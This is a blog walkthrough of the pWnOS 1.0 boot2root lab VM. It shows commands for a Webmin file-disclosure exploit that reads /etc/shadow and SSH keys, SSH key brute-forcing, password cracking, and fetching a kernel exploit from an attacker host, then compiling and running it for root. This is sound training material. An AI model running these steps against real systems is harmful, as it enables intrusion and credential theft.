---
title: 'pWnOS 1.0 Boot2Root VM Walkthrough'
date: 2019-09-25T18:49:00+01:00
draft: false
---

### **Vulnerabilities:**

*   Arbitrary File Disclosure
*   Privilege Escalation
*   Weak Credentials

### **Penetrating Methodologies:**

*   Network Scanning (Nmap)
*   Exploiting web application (Metasploit)
*   Extracting arbitrary file
*   1st Method
*   SSH Brute-force
*   Spawning TTY shell (Via SSH RSA key)
*   Kernel Privilege Escalation
*   2nd Method
*   Cracking password hashes (John the ripper)
*   Spawning TTY shell (via SSH login)
*   Kernel Privilege Escalation

**Let’s Begin!!**  
Start with the netdiscover command to identify target IP in the local network, in my network 192.168.1.105 is my target IP, you will get yours.  
![](https://i2.wp.com/4.bp.blogspot.com/-GVDMSI8kmtM/W1iuu5yqlgI/AAAAAAAAYog/U55u0wnYZ7koWBWCg-0vHXFaH9nPaJ-dgCLcBGAs/s1600/1.png?w=687&ssl=1)  
Further, let’s enumerate open and protocols information in the target’s network with help of nmap following command:  

nmap –A 192.168.1.105

1

nmap  –A  192.168.1.105

From its result, we found port 22 for SSH and 80, 1000 for HTTP are open. Moreover webmin – a web interface is running over port 1000.  
![](https://i2.wp.com/1.bp.blogspot.com/-p9ewt0RaNo8/W1iuwFKvfXI/AAAAAAAAYow/hEC8Dve5Cw0GvDMegA6dnJwh6Z5C60JEwCEwYBhgL/s1600/2.png?w=687&ssl=1)  
So I check related its exploit inside Metasploit and luckily found it can be exploited by nasty people to disclose potentially sensitive information. So with help of the following command, we execute this exploit to extract /etc/passwd file from inside the victim’s VM.  

use auxiliary/admin/webmin/file\_disclosure msf auxiliary(file\_disclosure) > set rhost 192.168.1.105 msf auxiliary(file\_disclosure) > exploit

1

2

3

use  auxiliary/admin/webmin/file\_disclosure

msf auxiliary(file\_disclosure)  \>  set rhost  192.168.1.105

msf auxiliary(file\_disclosure)  \>  exploit

As you can observe we have fetched available username of the victim’s system.  
![](https://i0.wp.com/4.bp.blogspot.com/-YBiUdDzAEqs/W1iuyF_171I/AAAAAAAAYpc/iH3fB6VIE68rulSB64T7wg-z9mcflMwJQCEwYBhgL/s1600/5.png?w=687&ssl=1)  

msf auxiliary(file\_disclosure) > set rpath /etc/shadow msf auxiliary(file\_disclosure) > exploit

1

2

msf auxiliary(file\_disclosure)  \>  set rpath  /etc/shadow

msf auxiliary(file\_disclosure)  \>  exploit

As you can observe we have also fetched a shadow file of the victim’s system which holds password hashes.  
![](https://i0.wp.com/3.bp.blogspot.com/-LOmVnyq0U6o/W1iuyIdj19I/AAAAAAAAYpg/xhGiazFPVI4KCzF79LKFnT5oYmtMj2slwCEwYBhgL/s1600/6.png?w=687&ssl=1)  

msf auxiliary(file\_disclosure) > set rpath /home/Obama/.ssh/authorized\_keys msf auxiliary(file\_disclosure) > exploit

1

2

msf auxiliary(file\_disclosure)  \>  set rpath  /home/Obama/.ssh/authorized\_keys

msf auxiliary(file\_disclosure)  \>  exploit

As you can observe that we got SSH authorized key and we can also enumerate username from inside the passwd. Now to obtain RSA key of SSH we can apply brute-force attack valid combination of authorized key and RSA key.  
![](https://i0.wp.com/3.bp.blogspot.com/-E_Q6kvCxmYY/W1iuycSQjAI/AAAAAAAAYpk/QUy6bOZ3wUYdxobu5kn13dNFrrupfst0QCEwYBhgL/s1600/8.png?w=687&ssl=1)  

### **1st Method to Exploit**

To do so we downloaded a tar file with help of the following command.  

wget https://github.com/offensive-security/exploit-database-bin-sploits.git

1

wget https://github.com/offensive-security/exploit-database-bin-sploits.git

Then extract the tar file with help of the following command:  

tar vxjf 5622.tar.bz2

1

tar vxjf  5622.tar.bz2

![](https://i1.wp.com/1.bp.blogspot.com/-7isZzaz19wQ/W1iuvOsDgWI/AAAAAAAAYpk/k1CUNMQUXyMW-MIAMx5KDYOsv-UYnDDnwCEwYBhgL/s1600/17.png?w=687&ssl=1)  
Move into extract folder and execute following for Grabbing a valid combination of a key.  

cd rsa grep -lr {authorized\_key}

1

2

cd  rsa

grep  \-lr  {authorized\_key}

Great, we successfully got rsa\_key for the authorized key.  
![](https://i0.wp.com/3.bp.blogspot.com/-7Od0aPtseNA/W1iuv48OW3I/AAAAAAAAYpc/5KDe3-hPj8gp_6q-JsIdbPTiCpfZI6pZwCEwYBhgL/s1600/19.png?w=687&ssl=1)  
Let’s login into SSH using above enumerated credential  

ssh -i 2048/dcbe2a56e8cdea6d17495f6648329ee2-4679.pub obama@192.168.1.105

1

ssh  \-i  2048/dcbe2a56e8cdea6d17495f6648329ee2\-4679.pub  obama@192.168.1.105

Yippeeee!! We logged in successfully, let’s find kernel details and then search its exploit.  

uname -a

1

uname  \-a

![](https://i1.wp.com/1.bp.blogspot.com/-Y6PihTH4I8E/W1iuwZtqCKI/AAAAAAAAYpU/ZD9CaVr3APUAECK-dE9HKbOSskeBse57ACEwYBhgL/s1600/20.png?w=687&ssl=1)  
So we found C-program file for exploit 5092 inside kali, let’s transfer it into Victim’s machine.  
![](https://i0.wp.com/3.bp.blogspot.com/-XMqx23TJxW4/W1iuwbD2lDI/AAAAAAAAYpY/nWNH8UDkAoEuo_alFiGQps8C2dObLQDnACEwYBhgL/s1600/21.png?w=687&ssl=1)  
Inside victim’s shell, we run following to download kernel exploit in his VM and compile it then Got root access on executing  

cd /tmp wget http://192.168.1.107/5902.c gcc 5092.c -o shell chmod 777 shell ./shell

1

2

3

4

5

cd  /tmp

wget http://192.168.1.107/5902.c

gcc  5092.c  \-o  shell

chmod  777  shell

./shell

Booommm! Here we have Root access.  
![](https://i0.wp.com/4.bp.blogspot.com/-0GVqm-jJQtM/W1iuxM--XoI/AAAAAAAAYpc/MjelQJrmD2YvEYrsRGUlj3Cf7y34KrOogCEwYBhgL/s1600/22.png?w=687&ssl=1)  

### **2nd Method**

As you have seen that with the help of Metasploit exploit we successfully fetched information of /etc/shadow file. So with the help of John, we can crack the hash password of shadow file.  

john --wordlist=/usr/share/wordlists/rockyou.txt pass

1

john  \--wordlist\=/usr/share/wordlists/rockyou.txt pass

So we got password h4ckm3 for VMware, let’s use it for SSH login.  
![](https://i1.wp.com/4.bp.blogspot.com/-j4Kxfpyt1e4/W1iuxYhCGqI/AAAAAAAAYpY/uJ1Pxzy8ap8PEN9R5VEQvvO1t8HkSgWVQCEwYBhgL/s1600/23.png?w=687&ssl=1)  

ssh vmware@192.168.1.105

1

ssh vmware@192.168.1.105

Now repeat above step for root privilege escalation and after exploiting its kernel, you get the root as shown in the image.  
![](https://i1.wp.com/1.bp.blogspot.com/-1oU2z9vqzfc/W1iuxx9X50I/AAAAAAAAYpg/Aatr8eFyO3cXplTe5VVTOYghvEklmxigQCEwYBhgL/s1600/24.png?w=687&ssl=1)  
**Author: **Aarti Singh